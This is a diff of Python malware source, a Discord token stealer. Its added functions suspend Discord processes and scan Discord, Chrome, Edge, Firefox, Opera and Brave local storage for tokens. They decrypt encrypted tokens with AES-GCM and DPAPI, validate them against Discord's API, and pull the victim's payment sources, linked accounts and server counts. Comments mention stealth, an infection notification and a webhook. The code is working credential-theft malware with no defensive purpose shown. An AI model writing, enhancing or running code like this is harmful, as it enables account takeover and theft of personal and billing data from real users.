+                                with open(file_path, read_mode, errors='ignore') as f:
+                                    if read_mode == 'rb':
+                                        content = f.read().decode('utf-8', errors='ignore')
+                                    else:
+                                        content = f.read()
+                                    
+                                    # Search for all token patterns
+                                    for pattern in token_patterns:
+                                        matches = re.findall(pattern, content)
+                                        
+                                        for match in matches:
                                             try:
-                                                response = requests.get('https://discord.com/api/v9/users/@me', headers={'Authorization': token})
-                                                if response.status_code == 200:
-                                                    uid = response.json()['id']
-                                                    if uid not in uids:
-                                                        tokens.append(token)
-                                                        uids.append(uid)
-                                            except:
-                                                pass
-                                except:
-                                    continue
-                    except:
+                                                if pattern.startswith('dQw4w9WgXcQ'):
+                                                    # Encrypted token - decrypt it
+                                                    encrypted_data = base64.b64decode(match.split('dQw4w9WgXcQ:')[1])
+                                                    token = decrypt_token(encrypted_data, master_key)
+                                                else:
+                                                    # Raw token - use directly
+                                                    token = match if isinstance(match, str) else match
+                                                
+                                                if token and len(token) > 50 and token not in processed_tokens:
+                                                    # Enhanced token validation
+                                                    if validate_discord_token_enhanced(token):
+                                                        processed_tokens.add(token)
+                                                        
+                                                        # Get detailed user info
+                                                        user_info = get_discord_user_info(token)
+                                                        if user_info and user_info.get('id') not in uids:
+                                                            tokens.append(token)
+                                                            uids.append(user_info.get('id'))
+                                                            print(f"Debug: Valid token found for user: {user_info.get('username', 'Unknown')}#{user_info.get('discriminator', '0000')}")
+                                                        
+                                            except Exception as token_error:
+                                                print(f"Debug: Token processing error: {str(token_error)}")
+                                                continue
+                                                
+                                break  # If text reading worked, don't try binary
+                            except UnicodeDecodeError:
+                                continue  # Try next read mode
+                            except Exception:
+                                continue
+                                
+                    except Exception as file_error:
+                        print(f"Debug: Error reading {file_name}: {str(file_error)}")
                         continue
+            
+            # Also check session storage and other Discord data
+            session_storage_path = os.path.join(base_path, "Session Storage")
+            if os.path.exists(session_storage_path):
+                print(f"Debug: Checking session storage for {name}")
+                for file_name in os.listdir(session_storage_path):
+                    if file_name.endswith((".ldb", ".log")):
+                        file_path = os.path.join(session_storage_path, file_name)
+                        try:
+                            with open(file_path, 'r', errors='ignore') as f:
+                                content = f.read()
+                                for pattern in token_patterns:
+                                    matches = re.findall(pattern, content)
+                                    for match in matches:
+                                        if isinstance(match, str) and len(match) > 50 and match not in processed_tokens:
+                                            if validate_discord_token_enhanced(match):
+                                                processed_tokens.add(match)
+                                                user_info = get_discord_user_info(match)
+                                                if user_info and user_info.get('id') not in uids:
+                                                    tokens.append(match)
+                                                    uids.append(user_info.get('id'))
+                        except:
+                            continue
         
         # Save count for webhook display
         counters['discord_tokens_found'] = len(tokens)
+        print(f"Debug: Total Discord tokens found: {len(tokens)}")
         
-        # Resume Discord processes that were suspended (more stealthy)
+        # Enhanced process restoration
         if running_discord_processes:
             try:
                 print(f"Debug: Resuming {len(running_discord_processes)} Discord processes...")
-                time.sleep(0.5)  # Brief wait
+                time.sleep(1)  # Brief wait
+                
                 for proc_info in running_discord_processes:
                     try:
                         # Try to resume the suspended process first
                         if 'process' in proc_info:
                             proc_info['process'].resume()
                             print(f"Debug: Resumed Discord process PID {proc_info['pid']}")
+                            time.sleep(0.2)  # Small delay between resumes
                     except (psutil.NoSuchProcess, psutil.AccessDenied):
                         # Process no longer exists, try to restart it
                         try:
-                            subprocess.Popen([proc_info['exe']], shell=False, 
-                                           stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+                            # Use original command line if available
+                            if proc_info.get('cmdline') and len(proc_info['cmdline']) > 0:
+                                subprocess.Popen(proc_info['cmdline'], shell=False, 
+                                               stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+                            else:
+                                subprocess.Popen([proc_info['exe']], shell=False, 
+                                               stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                             print(f"Debug: Restarted Discord from: {proc_info['exe']}")
                         except Exception as e:
                             print(f"Debug: Failed to restart {proc_info['exe']}: {str(e)}")
@@ -2412,11 +2893,15 @@ def steal_discord_tokens_original_backup():
                                            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                         except:
                             pass
+                            
             except Exception as e:
                 print(f"Debug: Error resuming Discord processes: {str(e)}")
         
+        print(f"Debug: Discord token extraction complete. Found {len(tokens)} valid tokens.")
         return tokens
+        
     except Exception as e:
+        print(f"Debug: Discord token extraction failed: {str(e)}")
         return []
 
 def get_master_key(path):
@@ -2431,12 +2916,70 @@ def get_master_key(path):
         return None
 
 def decrypt_token(buff, master_key):
+    """Enhanced Discord token decryption with multiple methods"""
     try:
-        iv = buff[3:15]
-        payload = buff[15:]
-        cipher = AES.new(master_key, AES.MODE_GCM, iv)
-        return cipher.decrypt(payload)[:-16].decode()
-    except:
+        # Method 1: Standard AES-GCM decryption (current Discord method)
+        try:
+            if len(buff) < 31:  # Minimum size check
+                return None
+                
+            iv = buff[3:15]  # 12 bytes IV
+            payload = buff[15:-16]  # Payload without tag
+            tag = buff[-16:]  # 16 bytes authentication tag
+            
+            cipher = AES.new(master_key, AES.MODE_GCM, nonce=iv)
+            decrypted = cipher.decrypt_and_verify(payload, tag)
+            return decrypted.decode('utf-8')
+            
+        except Exception as aes_error:
+            print(f"Debug: AES-GCM decryption failed: {str(aes_error)}")
+            pass
+        
+        # Method 2: Fallback AES-GCM without tag verification (older method)
+        try:
+            iv = buff[3:15]
+            payload = buff[15:]
+            cipher = AES.new(master_key, AES.MODE_GCM, nonce=iv)
+            decrypted = cipher.decrypt(payload)[:-16]  # Remove tag from end
+            return decrypted.decode('utf-8')
+            
+        except Exception as fallback_error:
+            print(f"Debug: Fallback AES-GCM decryption failed: {str(fallback_error)}")
+            pass
+        
+        # Method 3: DPAPI decryption (older Discord versions)
+        try:
+            import win32crypt
+            decrypted = win32crypt.CryptUnprotectData(buff, None, None, None, 0)[1]
+            return decrypted.decode('utf-8')
+            
+        except Exception as dpapi_error:
+            print(f"Debug: DPAPI decryption failed: {str(dpapi_error)}")
+            pass
+        
+        # Method 4: Try different IV positions (Discord version variations)
+        iv_positions = [(3, 15), (0, 12), (5, 17)]
+        for start, end in iv_positions:
+            try:
+                if len(buff) < end + 16:
+                    continue
+                    
+                iv = buff[start:end]
+                payload = buff[end:-16]
+                tag = buff[-16:]
+                
+                cipher = AES.new(master_key, AES.MODE_GCM, nonce=iv)
+                decrypted = cipher.decrypt_and_verify(payload, tag)
+                return decrypted.decode('utf-8')
+                
+            except:
+                continue
+        
+        print(f"Debug: All decryption methods failed for buffer length {len(buff)}")
+        return None
+        
+    except Exception as e:
+        print(f"Debug: Token decryption error: {str(e)}")
         return None
 
 def validate_token(token):
@@ -2445,6 +2988,242 @@ def validate_token(token):
         return response.status_code == 200
     except:
         return False
+
+def validate_discord_token_enhanced(token):
+    """Enhanced Discord token validation with multiple checks"""
+    try:
+        if not token or len(token) < 50:
+            return False
+        
+        # Check token format (basic structure validation)
+        parts = token.split('.')
+        if len(parts) != 3:
+            return False
+        
+        # Check if token contains valid base64-like characters
+        import string
+        valid_chars = string.ascii_letters + string.digits + '-_'
+        if not all(c in valid_chars for part in parts for c in part):
+            return False
+        
+        # Try to validate with Discord API (multiple endpoints for reliability)
+        headers = {'Authorization': token, 'Content-Type': 'application/json'}
+        
+        # Primary validation endpoint
+        try:
+            response = requests.get('https://discord.com/api/v9/users/@me', headers=headers, timeout=10)
+            if response.status_code == 200:
+                return True
+        except:
+            pass
+        
+        # Fallback validation endpoints
+        fallback_endpoints = [
+            'https://discord.com/api/v9/users/@me/settings',
+            'https://discord.com/api/v9/users/@me/guilds',
+            'https://discord.com/api/v9/users/@me/channels'
+        ]
+        
+        for endpoint in fallback_endpoints:
+            try:
+                response = requests.get(endpoint, headers=headers, timeout=5)
+                if response.status_code == 200:
+                    return True
+            except:
+                continue
+        
+        return False
+        
+    except Exception as e:
+        print(f"Debug: Token validation error: {str(e)}")
+        return False
+
+def get_discord_user_info(token):
+    """Get detailed Discord user information from token"""
+    try:
+        headers = {'Authorization': token, 'Content-Type': 'application/json'}
+        
+        # Get basic user info
+        response = requests.get('https://discord.com/api/v9/users/@me', headers=headers, timeout=10)
+        if response.status_code != 200:
+            return None
+        
+        user_data = response.json()
+        
+        # Get additional user info (billing, connections, etc.)
+        additional_info = {}
+        
+        # Try to get billing information
+        try:
+            billing_response = requests.get('https://discord.com/api/v9/users/@me/billing/payment-sources', headers=headers, timeout=5)
+            if billing_response.status_code == 200:
+                additional_info['payment_sources'] = billing_response.json()
+        except:
+            pass
+        
+        # Try to get connections (linked accounts)
+        try:
+            connections_response = requests.get('https://discord.com/api/v9/users/@me/connections', headers=headers, timeout=5)
+            if connections_response.status_code == 200:
+                additional_info['connections'] = connections_response.json()
+        except:
+            pass
+        
+        # Try to get guild count
+        try:
+            guilds_response = requests.get('https://discord.com/api/v9/users/@me/guilds', headers=headers, timeout=5)
+            if guilds_response.status_code == 200:
+                additional_info['guild_count'] = len(guilds_response.json())
+        except:
+            pass
+        
+        # Combine all information
+        user_data.update(additional_info)
+        return user_data
+        
+    except Exception as e:
+        print(f"Debug: Error getting user info: {str(e)}")
+        return None
+
+def extract_discord_tokens_from_browsers():
+    """Extract Discord tokens from browser storage (alternative method)"""
+    try:
+        tokens = []
+        
+        # Browser local storage paths where Discord tokens might be stored
+        browser_paths = [
+            # Chrome
+            (os.path.join(os.getenv('LOCALAPPDATA'), 'Google', 'Chrome', 'User Data', 'Default', 'Local Storage', 'leveldb'), 'Chrome'),
+            (os.path.join(os.getenv('LOCALAPPDATA'), 'Google', 'Chrome', 'User Data', 'Profile 1', 'Local Storage', 'leveldb'), 'Chrome Profile 1'),
+            
+            # Edge
+            (os.path.join(os.getenv('LOCALAPPDATA'), 'Microsoft', 'Edge', 'User Data', 'Default', 'Local Storage', 'leveldb'), 'Edge'),
+            
+            # Firefox (sessionstore)
+            (os.path.join(os.getenv('APPDATA'), 'Mozilla', 'Firefox', 'Profiles'), 'Firefox'),
+            
+            # Opera
+            (os.path.join(os.getenv('APPDATA'), 'Opera Software', 'Opera Stable', 'Local Storage', 'leveldb'), 'Opera'),
+            
+            # Brave
+            (os.path.join(os.getenv('LOCALAPPDATA'), 'BraveSoftware', 'Brave-Browser', 'User Data', 'Default', 'Local Storage', 'leveldb'), 'Brave'),
+        ]
+        
+        discord_domains = ['discord.com', 'discordapp.com']
+        token_patterns = [
+            r'["\']([A-Za-z0-9_-]{24}\.[A-Za-z0-9_-]{6}\.[A-Za-z0-9_-]{25,})["\']',  # Raw token pattern
+            r'token["\']?\s*[:\=]\s*["\']([A-Za-z0-9_-]{50,})["\']',  # Token assignment
+            r'authorization["\']?\s*[:\=]\s*["\']([A-Za-z0-9_-]{50,})["\']',  # Authorization header
+        ]
+        
+        for path, browser_name in browser_paths:
+            if not os.path.exists(path):
+                continue
+            
+            try:
+                if browser_name == 'Firefox':
+                    # Special handling for Firefox profiles
+                    for profile_dir in os.listdir(path):
+                        profile_path = os.path.join(path, profile_dir)
+                        if os.path.isdir(profile_path):
+                            sessionstore_path = os.path.join(profile_path, 'sessionstore-backups')
+                            if os.path.exists(sessionstore_path):
+                                for file_name in os.listdir(sessionstore_path):
+                                    if file_name.endswith('.jsonlz4') or file_name.endswith('.json'):
+                                        file_path = os.path.join(sessionstore_path, file_name)
+                                        try:
+                                            with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
+                                                content = f.read()
+                                                if any(domain in content for domain in discord_domains):
+                                                    for pattern in token_patterns:
+                                                        matches = re.findall(pattern, content)
+                                                        for match in matches:
+                                                            if validate_discord_token_enhanced(match):
+                                                                tokens.append((match, f'{browser_name} - {profile_dir}'))
+                                        except:
+                                            continue
+                else:
+                    # Handle Chromium-based browsers
+                    for file_name in os.listdir(path):
+                        if file_name.endswith(('.ldb', '.log')):
+                            file_path = os.path.join(path, file_name)
+                            try:
+                                with open(file_path, 'rb') as f:
+                                    content = f.read().decode('utf-8', errors='ignore')
+                                    
+                                # Look for Discord-related content
+                                if any(domain in content for domain in discord_domains):
+                                    for pattern in token_patterns:
+                                        matches = re.findall(pattern, content)
+                                        for match in matches:
+                                            if validate_discord_token_enhanced(match):
+                                                tokens.append((match, browser_name))
+                            except:
+                                continue
+                                
+            except Exception as browser_error:
+                print(f"Debug: Error scanning {browser_name}: {str(browser_error)}")
+                continue
+        
+        return tokens
+        
+    except Exception as e:
+        print(f"Debug: Browser token extraction error: {str(e)}")
+        return []
+
+def extract_discord_tokens_from_memory():
+    """Extract Discord tokens from running process memory (advanced method)"""
+    try:
+        tokens = []
+        
+        # Find Discord processes
+        discord_processes = []
+        for proc in psutil.process_iter(['pid', 'name', 'exe']):
+            try:
+                if 'discord' in proc.info['name'].lower():
+                    discord_processes.append(proc)
+            except:
+                continue
+        
+        if not discord_processes:
+            return tokens
+        
+        # This is a simplified memory scanning approach
+        # In a real implementation, you would use more advanced memory reading techniques
+        for proc in discord_processes:
+            try:
+                # Get process memory info
+                memory_info = proc.memory_info()
+                
+                # Look for token patterns in process command line and environment
+                try:
+                    cmdline = proc.cmdline()
+                    environ = proc.environ() if hasattr(proc, 'environ') else {}
+                    
+                    # Combine command line and environment for scanning
+                    search_text = ' '.join(cmdline) + ' ' + ' '.join(f"{k}={v}" for k, v in environ.items())
+                    
+                    token_patterns = [
+                        r'[A-Za-z0-9_-]{24}\.[A-Za-z0-9_-]{6}\.[A-Za-z0-9_-]{25,}',
+                    ]
+                    
+                    for pattern in token_patterns:
+                        matches = re.findall(pattern, search_text)
+                        for match in matches:
+                            if validate_discord_token_enhanced(match):
+                                tokens.append((match, f'Memory - PID {proc.pid}'))
+                                
+                except (psutil.AccessDenied, psutil.NoSuchProcess):
+                    continue
+                    
+            except Exception as proc_error:
+                continue
+        
+        return tokens
+        
+    except Exception as e:
+        print(f"Debug: Memory token extraction error: {str(e)}")
+        return []
 
 # Payload 2: Infection notification
 def send_infection_notification():
